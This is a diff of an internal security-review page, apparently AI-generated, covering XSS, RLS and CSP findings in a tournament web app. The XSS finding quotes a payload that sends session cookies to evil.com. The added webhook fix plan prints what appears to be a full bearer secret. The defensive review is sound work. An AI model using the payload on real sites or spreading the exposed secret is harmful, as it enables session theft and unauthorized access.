-    <strong>Fix Plan</strong>
-    1. Open feed.html. Find <code>_parseMentions</code> function (~line 370).<br>
-    2. Identify every point where its return value is assigned to <code>.innerHTML</code>.<br>
-    3. Option A (surgical): wrap the final output with <code>esc()</code> before innerHTML assignment — but this will strip the mention highlighting markup. <br>
-    4. Option B (correct): build <code>_parseMentions</code> to return a DocumentFragment — use <code>document.createElement</code> + <code>textContent</code> for plain text segments, and <code>createElement('span')</code> + <code>textContent</code> for mention spans. Then <code>.appendChild(fragment)</code> instead of innerHTML. No esc() needed — DOM API is inherently safe.<br>
-    5. QA: post a message containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Verify it renders as literal text, not executed JS.
-  </div>
-</div>
+    <div class="sec-finding sev-high">
+      <div class="sec-header">
+        <span class="pill pill-red">HIGH</span>
+        <span class="sec-title">Stored XSS — feed.html:377 <code>_parseMentions</code> to innerHTML</span>
+      </div>
+      <div class="sec-body"><code>feed.html:377</code>: the <code>_parseMentions(p.message)</code> function output is rendered directly to <code>innerHTML</code> without passing through <code>esc()</code>. The <code>p.message</code> field is player-controlled trash talk submitted via the feed post form. A malicious player submits <code>&lt;img src=x onerror="document.location='https://evil.com?c='+document.cookie"&gt;</code> as a message. When any player — or admin — opens the feed, the script executes in their session. Feed is a public page visible to all tournament participants.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan</strong>
+        1. Open feed.html. Find <code>_parseMentions</code> function (~line 370).<br>
+        2. Option A (surgical): wrap final output with <code>esc()</code> before innerHTML — strips mention highlighting.<br>
+        3. Option B (correct): build <code>_parseMentions</code> to return a DocumentFragment — use <code>createElement</code> + <code>textContent</code> for plain text, <code>createElement('span')</code> + <code>textContent</code> for mention spans. Append fragment instead of innerHTML. No esc() needed — DOM API is inherently safe.<br>
+        4. QA: post a message containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Verify it renders as literal text, not executed JS.
+      </div>
+    </div>
 
-<div class="sec-item sev-high">
-  <div class="sec-header"><span class="pill pill-red">HIGH</span><span class="sec-title">Possible XSS — admin.html:~2044 and ~2194 <code>url</code> in innerHTML</span></div>
-  <div class="sec-body">
-    <code>admin.html</code> lines approximately 2044 and 2194 render a <code>url</code> value directly into an <code>innerHTML</code> template literal. If this <code>url</code> field originates from player-submitted data or settings, it is an XSS vector on the admin page. Admin sessions are highest-value targets — an admin XSS would allow an attacker to extract all tournament data, modify scores, or add malicious tournament admins.
-  </div>
-  <div class="sec-fix">
-    <strong>Fix Plan</strong>
-    1. Open admin.html. Grep for <code>innerHTML</code> near lines 2044 and 2194.<br>
-    2. Identify the data source of the <code>url</code> variable — is it from a DB column or a hardcoded config?<br>
-    3. If player/user-controlled: wrap with <code>esc(url)</code> before inserting into template literal.<br>
-    4. If always a known safe value (e.g., a Supabase storage URL): add an assertion that the value starts with <code>https://</code> — reject anything else.<br>
-    5. Confirm admin.html has <code>function esc(str)</code> defined (it does — cited in prior reviews). Ensure esc is called before innerHTML in both locations.
-  </div>
-</div>
+    <div class="sec-finding sev-high">
+      <div class="sec-header">
+        <span class="pill pill-red">HIGH</span>
+        <span class="sec-title">Possible XSS — admin.html:~2044 and ~2194 <code>url</code> in innerHTML</span>
+      </div>
+      <div class="sec-body"><code>admin.html</code> lines approximately 2044 and 2194 render a <code>url</code> value directly into an <code>innerHTML</code> template literal. If this <code>url</code> field originates from player-submitted data or settings, it is an XSS vector on the admin page. Admin sessions are highest-value targets — an admin XSS would allow an attacker to extract all tournament data, modify scores, or add malicious admins.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan</strong>
+        1. Open admin.html. Grep for <code>innerHTML</code> near lines 2044 and 2194.<br>
+        2. Identify the data source of the <code>url</code> variable — is it from a DB column or hardcoded config?<br>
+        3. If player/user-controlled: wrap with <code>esc(url)</code> before inserting into template literal.<br>
+        4. If always a safe value (e.g., Supabase storage URL): add assertion that value starts with <code>https://</code>.<br>
+        5. Confirm admin.html has <code>function esc(str)</code> defined (it does). Ensure esc is called before innerHTML in both locations.
+      </div>
+    </div>
 
-<div class="sec-item sev-med">
-  <div class="sec-header"><span class="pill pill-orange">MEDIUM</span><span class="sec-title">RLS — <code>player_accounts</code> anon SELECT USING(true)</span></div>
-  <div class="sec-body">
-    <code>migrations/005_invitations_and_accounts.sql:41</code>: <code>CREATE POLICY "anon read player accounts" ON player_accounts FOR SELECT TO anon USING (true);</code>. This policy allows any unauthenticated HTTP request to enumerate all player account records, including <code>billing_status</code>, <code>billing_expires_at</code>, and <code>billing_ref</code>. While email is the only PII column, exposing billing status across all players has compliance implications and enables targeted billing manipulation probing.
-  </div>
-  <div class="sec-fix">
-    <strong>Fix Plan</strong>
-    1. Write migration <code>012_tighten_player_accounts_rls.sql</code>.<br>
-    2. Drop policy: <code>DROP POLICY "anon read player accounts" ON player_accounts;</code><br>
-    3. Replace: <code>CREATE POLICY "owner read player account" ON player_accounts FOR SELECT TO authenticated USING (email = auth.email());</code><br>
-    4. Add admin read: <code>CREATE POLICY "admin read player accounts" ON player_accounts FOR SELECT TO authenticated USING (EXISTS (SELECT 1 FROM tournament_admins WHERE email = auth.email()));</code><br>
-    5. Test: confirm login.html can still fetch the player's own account, and /player page admin view still works.
-  </div>
-</div>
+    <div class="sec-finding sev-med">
+      <div class="sec-header">
+        <span class="pill pill-orange">MEDIUM</span>
+        <span class="sec-title">RLS — <code>player_accounts</code> anon SELECT USING(true)</span>
+      </div>
+      <div class="sec-body"><code>migrations/005_invitations_and_accounts.sql:41</code>: <code>CREATE POLICY "anon read player accounts" ON player_accounts FOR SELECT TO anon USING (true);</code>. This allows any unauthenticated HTTP request to enumerate all player account records, including <code>billing_status</code>, <code>billing_expires_at</code>, and <code>billing_ref</code>. Exposing billing status across all players has compliance implications and enables targeted billing manipulation probing.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan</strong>
+        1. Write migration <code>012_tighten_player_accounts_rls.sql</code>.<br>
+        2. Drop policy: <code>DROP POLICY "anon read player accounts" ON player_accounts;</code><br>
+        3. Replace: <code>CREATE POLICY "owner read player account" ON player_accounts FOR SELECT TO authenticated USING (email = auth.email());</code><br>
+        4. Add admin read: <code>CREATE POLICY "admin read player accounts" ON player_accounts FOR SELECT TO authenticated USING (EXISTS (SELECT 1 FROM tournament_admins WHERE email = auth.email()));</code><br>
+        5. Test: confirm login.html can still fetch the player's own account, and /player admin view still works.
+      </div>
+    </div>
 
-<div class="sec-item sev-med">
-  <div class="sec-header"><span class="pill pill-orange">MEDIUM</span><span class="sec-title">CSP <code>unsafe-inline</code> Nullifies XSS Protection</span></div>
-  <div class="sec-body">
-    <code>vercel.json</code> Content-Security-Policy header includes <code>unsafe-inline</code> in the <code>script-src</code> directive. This explicitly allows inline <code>&lt;script&gt;</code> blocks to execute, which is required because all TOURney pages use inline JavaScript. The consequence: any XSS injection (like feed.html:377) is executable — the browser won't block it even though a CSP header is present.
-  </div>
-  <div class="sec-fix">
-    <strong>Fix Plan</strong>
-    1. Sprint: extract one page's inline JS to an external .js file (start with a small page).<br>
-    2. Test that the page functions correctly with the external file loaded via <code>&lt;script src="..."&gt;</code>.<br>
-    3. Once all inline scripts on a page are external, add a <code>nonce</code> attribute to any remaining inline scripts or use SHA-256 hashes in the CSP directive.<br>
-    4. Update vercel.json CSP to remove <code>unsafe-inline</code> once all pages are migrated.<br>
-    5. This is a multi-sprint effort — prioritize pages with known XSS vectors (feed.html, admin.html) first.
-  </div>
-</div>
+    <div class="sec-finding sev-med">
+      <div class="sec-header">
+        <span class="pill pill-orange">MEDIUM</span>
+        <span class="sec-title">CSP <code>unsafe-inline</code> Nullifies XSS Protection</span>
+      </div>
+      <div class="sec-body"><code>vercel.json</code> Content-Security-Policy header includes <code>unsafe-inline</code> in the <code>script-src</code> directive. This explicitly allows inline <code>&lt;script&gt;</code> blocks to execute, which is required because all TOURney pages use inline JavaScript. The consequence: any XSS injection (like feed.html:377) is executable — the browser won't block it even though a CSP header is present.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan</strong>
+        1. Sprint: extract one page's inline JS to an external .js file (start with a small page, e.g. champions.html).<br>
+        2. Test that the page functions correctly with the external file loaded via <code>&lt;script src="..."&gt;</code>.<br>
+        3. Once all inline scripts on a page are external, add a <code>nonce</code> attribute or use SHA-256 hashes in the CSP directive.<br>
+        4. Update vercel.json CSP to remove <code>unsafe-inline</code> once all pages are migrated.<br>
+        5. Multi-sprint effort — prioritize pages with known XSS vectors (feed.html, admin.html) first.
+      </div>
+    </div>
 
-<div class="sec-item sev-med">
-  <div class="sec-header"><span class="pill pill-orange">MEDIUM</span><span class="sec-title">SEND_INSTALL_EMAIL_SECRET Not Set — Webhook Gate Inactive</span></div>
-  <div class="sec-body">
-    <code>send-install-email</code> v4 is deployed to Supabase edge functions with a webhook secret gate in the function code. However, the <code>SEND_INSTALL_EMAIL_SECRET</code> environment variable has not been set in the Supabase dashboard. This means the gate is present in code but not enforced at runtime — the function may accept any request without the secret header. Source: qa-bugs-test-2026.md session 14 notes + grades.json security axis (May 13).
-  </div>
-  <div class="sec-fix">
-    <strong>Fix Plan</strong>
-    1. Go to Supabase dashboard → Project jllugkiojeoopitdvzsa → Edge Functions → send-install-email → Secrets.<br>
-    2. Add secret: key = <code>SEND_INSTALL_EMAIL_SECRET</code>, value = a randomly generated 32-character string.<br>
-    3. Update the DB webhook configuration to include this secret as an Authorization header.<br>
-    4. Test: call the function without the header → expect 401. Call with correct header → expect 200 or message sent.<br>
-    5. <strong>This is a Rob manual action — no code deploy needed.</strong>
-  </div>
-</div>
+    <div class="sec-finding sev-med">
+      <div class="sec-header">
+        <span class="pill pill-orange">MEDIUM</span>
+        <span class="sec-title">SEND_INSTALL_EMAIL_SECRET — Webhook Authorization Header Not Wired</span>
+      </div>
+      <div class="sec-body"><code>send-install-email</code> v6 is deployed to Supabase edge functions with a webhook secret gate in the function code. The <code>SEND_INSTALL_EMAIL_SECRET</code> env var is now set in Supabase dashboard. However, the Supabase Database Webhook (players INSERT) has not yet been updated to include the Authorization header. Gate is present in code but not enforced at runtime until the webhook header is wired. Source: ceo-tasks.json <code>wire_install_email_webhook</code> task.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan (Rob manual — 5 minutes)</strong>
+        1. Go to Supabase Dashboard → Project jllugkiojeoopitdvzsa → Database → Webhooks.<br>
+        2. Find the players INSERT webhook. Edit it.<br>
+        3. Add header: <code>Authorization: Bearer f388de9ca0f1f7f78a215d0191687fd611a5fb4d245bcd242db952d873121e94</code><br>
+        4. Save. Test: insert a player row → verify edge function logs show authorized request.
+      </div>
+    </div>
 
-<div class="sec-item sev-low">
-  <div class="sec-header"><span class="pill pill-green">LOW</span><span class="sec-title">RLS — players / scores Tables May Still Have Permissive Pre-Multi-Tenant Policies</span></div>
-  <div class="sec-body">
-    <code>migrations/001_add_tournaments.sql:101</code> (comment): <em>"Players/scores/settings: existing permissive policies stay in place. Tighten in migration 002 once all query-side filtering is confirmed working."</em> No subsequent migration (002–011) creates tighter RLS policies on <code>players</code> or <code>scores</code>. The live database may still have the original USING(true) policies from before multi-tenant was introduced. Query-side filtering (WHERE tournament_id = ?) filters results correctly, but any authenticated user could theoretically insert or update scores across tournaments if the write policies are permissive.
-  </div>
-  <div class="sec-fix">
-    <strong>Fix Plan</strong>
-    1. Verify live policies: Supabase dashboard → Authentication → Policies → players + scores tables.<br>
-    2. If permissive INSERT/UPDATE/DELETE exist: write <code>012_tighten_players_scores_rls.sql</code> (or add to existing 012 migration).<br>
-    3. Replace permissive INSERT with: <code>USING (tournament_id IN (SELECT tournament_id FROM tournament_admins WHERE email = auth.email()))</code>.<br>
-    4. For SELECT (read): <code>USING (true)</code> is acceptable for public tournaments — all players can see each other's scores. Consider <code>USING (tournament_id = ANY(array of accessible tournament IDs))</code> for private tournaments in future.<br>
-    5. Test: confirm non-admin cannot insert scores into another tournament.
-  </div>
-</div>
+    <div class="sec-finding sev-low">
+      <div class="sec-header">
+        <span class="pill pill-green">LOW</span>
+        <span class="sec-title">RLS — players / scores Tables May Still Have Permissive Pre-Multi-Tenant Policies</span>
+      </div>
+      <div class="sec-body"><code>migrations/001_add_tournaments.sql:101</code> (comment): <em>"Players/scores/settings: existing permissive policies stay in place. Tighten in migration 002 once all query-side filtering is confirmed working."</em> No subsequent migration (002–011) creates tighter RLS policies on <code>players</code> or <code>scores</code>. Query-side filtering (WHERE tournament_id = ?) filters results correctly, but any authenticated user could theoretically insert or update scores across tournaments if the write policies are permissive.</div>
+      <div class="sec-fix">
+        <strong>Fix Plan</strong>
+        1. Verify live policies: Supabase dashboard → Authentication → Policies → players + scores tables.<br>
+        2. If permissive INSERT/UPDATE/DELETE exist: write <code>012_tighten_players_scores_rls.sql</code> (or add to existing 012 migration).<br>
+        3. Replace permissive INSERT with: <code>USING (tournament_id IN (SELECT tournament_id FROM tournament_admins WHERE email = auth.email()))</code>.<br>
+        4. SELECT USING(true) is acceptable for public tournaments. Test: confirm non-admin cannot insert scores into another tournament.
+      </div>
+    </div>
 
-<div class="sec-item sev-info">
-  <div class="sec-header"><span class="pill pill-blue">INFO</span><span class="sec-title">Positives — What's Working Correctly</span></div>
-  <div class="sec-body">
-    <strong style="color:var(--green)">stripe-webhook:</strong> Stripe signature verification via <code>STRIPE_WEBHOOK_SECRET</code>. Handles checkout.completed, subscription.updated, subscription.deleted, invoice.payment_failed. Returns 200 on handler errors (correct Stripe pattern).<br><br>
-    <strong style="color:var(--green)">create-checkout:</strong> JWT-gated. Stripe secret key held server-side in Supabase secrets — never in client HTML.<br><br>
-    <strong style="color:var(--green)">send-push v9:</strong> JWT auth + owner/admin check. Deployed and live in production.<br><br>
-    <strong style="color:var(--green)">Security headers:</strong> HSTS, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy all correct in vercel.json.<br><br>
-    <strong style="color:var(--green)">No credential leaks:</strong> No Supabase keys or Stripe keys found in any HTML file. tourney-init.js injects credentials at runtime from a server-side source.<br><br>
-    <strong style="color:var(--green)">esc() consistency:</strong> Player names in champions.html and feed.html rendered via esc() helper. The pattern exists — the gaps are specific innerHTML assignments that missed it.
+    <div class="sec-finding sev-info">
+      <div class="sec-header">
+        <span class="pill pill-blue">INFO</span>
+        <span class="sec-title">Positives — What's Working Correctly</span>
+      </div>
+      <div class="sec-body">
+        <strong style="color:var(--green)">stripe-webhook:</strong> Stripe signature verification via <code>STRIPE_WEBHOOK_SECRET</code>. Handles checkout.completed, subscription.updated, subscription.deleted, invoice.payment_failed. Returns 200 on handler errors (correct Stripe pattern).<br><br>
+        <strong style="color:var(--green)">create-checkout:</strong> JWT-gated. Stripe secret key held server-side in Supabase secrets — never in client HTML.<br><br>
+        <strong style="color:var(--green)">send-push v9:</strong> JWT auth + owner/admin check. Deployed and live in production.<br><br>
+        <strong style="color:var(--green)">Security headers:</strong> HSTS, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy all correct in vercel.json.<br><br>
+        <strong style="color:var(--green)">No credential leaks:</strong> No Supabase keys or Stripe keys found in any HTML file. tourney-init.js injects credentials at runtime from a server-side source.<br><br>
+        <strong style="color:var(--green)">esc() consistency:</strong> Player names in champions.html and feed.html rendered via esc() helper. The pattern exists — the gaps are specific call sites, not a missing helper.
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:1.5rem;">
+      <div class="card-title">Security Sprint Plan</div>
+      <table class="page-table" style="margin-top:.5rem;">
+        <thead><tr><th>Phase</th><th>Items</th><th>Effort</th></tr></thead>
+        <tbody>
+          <tr><td><span class="pill pill-red">Day 1</span></td><td>Wire players INSERT webhook Authorization header (Rob manual, 5min). Fix feed.html:377 _parseMentions XSS. Fix admin.html:2044/2194 url innerHTML.</td><td>~2h dev + 5min Rob</td></tr>
+          <tr><td><span class="pill pill-orange">Day 1–2</span></td><td>Write migration 012 — tighten player_accounts anon read. Verify players/scores policies in Supabase dashboard.</td><td>~2h dev + QA</td></tr>
+          <tr><td><span class="pill pill-gold">Week 1</span></td><td>Begin CSP unsafe-inline removal — start with champions.html and feed.html (smallest pages). Extract inline scripts to external files.</td><td>~4h per page</td></tr>
+          <tr><td><span class="pill pill-blue">Pre-Launch</span></td><td>Full CSP unsafe-inline removed across all pages. GitHub Actions edge function deploy pipeline. Staging environment.</td><td>Multi-sprint</td></tr>
+          <tr><td><span class="pill pill-green">Post-Launch</span></td><td>Sentry error monitoring. Security audit by external party. GDPR data deletion endpoint.</td><td>Month 2+</td></tr>
+        </tbody>
+      </table>
+    </div>
+
   </div>
-</div>
-
-<div class="card" style="margin-top:1.5rem;">
-  <div class="card-title">Security Sprint Plan</div>
-  <table class="page-table" style="margin-top:0.5rem;">
-    <thead><tr><th>Phase</th><th>Items</th><th>Effort</th></tr></thead>
-    <tbody>
-      <tr><td><span class="pill pill-red">Day 1</span></td><td>Set SEND_INSTALL_EMAIL_SECRET in Supabase (Rob action). Fix feed.html:377 _parseMentions XSS. Fix admin.html:2044/2194 url innerHTML.</td><td>~2h dev + Rob 15min manual</td></tr>
-      <tr><td><span class="pill pill-orange">Day 1–2</span></td><td>Write migration 012 — tighten player_accounts anon read. Verify players/scores policies in Supabase dashboard.</td><td>~2h dev + QA</td></tr>
-      <tr><td><span class="pill pill-gold">Week 1</span></td><td>Begin CSP unsafe-inline removal — start with champions.html and feed.html (smallest pages). Extract inline scripts to external files.</td><td>~4h per page</td></tr>
-      <tr><td><span class="pill pill-blue">Pre-Launch</span></td><td>Full CSP unsafe-inline removed across all pages. GitHub Actions edge function deploy pipeline. Staging environment.</td><td>Multi-sprint</td></tr>
-      <tr><td><span class="pill pill-green">Post-Launch</span></td><td>Sentry error monitoring. Security audit by external party. GDPR data deletion endpoint.</td><td>Month 2+</td></tr>
-    </tbody>
-  </table>
-</div>
-
-</div>
 </section>
+
+</div>
+</div>
 
 <footer>
-  Generated by <span>Claude Sonnet 4.6</span> · Greenskeeper Studios Internal · May 13, 2026
-  <br style="margin-top:0.3rem">
-  <a href="/" style="color:var(--muted); font-size:0.72rem; text-decoration:none">← tourney.greenskeeper.studio</a>
+  Generated by <span>Claude Sonnet 4.6</span> · Greenskeeper Studios Internal · May 13, 2026 &nbsp;·&nbsp;
+  <a href="/platform">← Platform</a>
 </footer>
 
 <script>
-  let bugCount = 5;
-  function addBugRow() {
-    bugCount++;
-    const tbody = document.getElementById('bugRows');
-    if (!tbody) return;
-    const tr = document.createElement('tr');
-    tr.innerHTML = `
-      <td style="color:var(--muted);font-size:0.75rem">${bugCount}</td>
-      <td><select class="input-cell"><option>🔴 Critical</option><option>🟠 High</option><option>🟡 Medium</option><option>🟢 Low</option></select></td>
-      <td><input class="input-cell" type="text" placeholder="Flow / page"></td>
-      <td><input class="input-cell" type="text" placeholder="Describe the bug..."></td>
-      <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
-    `;
-    tbody.appendChild(tr);
-    tr.querySelector('input').focus();
-  }
+let bugCount = 5;
+function addBugRow() {
+  bugCount++;
+  const tbody = document.getElementById('bugRows');
+  if (!tbody) return;
+  const tr = document.createElement('tr');
+  tr.innerHTML = `
+    <td style="color:var(--muted);font-size:.75rem">${bugCount}</td>
+    <td><select class="input-cell"><option>High</option><option>Medium</option><option>Low</option><option>Critical</option></select></td>
+    <td><input class="input-cell" type="text" placeholder="Flow / page"></td>
+    <td><input class="input-cell" type="text" placeholder="Describe the bug..."></td>
+    <td><select class="input-cell"><option>Open</option><option>In Progress</option><option>Fixed</option><option>Won't Fix</option></select></td>
+  `;
+  tbody.appendChild(tr);
+  tr.querySelector('input').focus();
+}
 </script>
 
 </body>
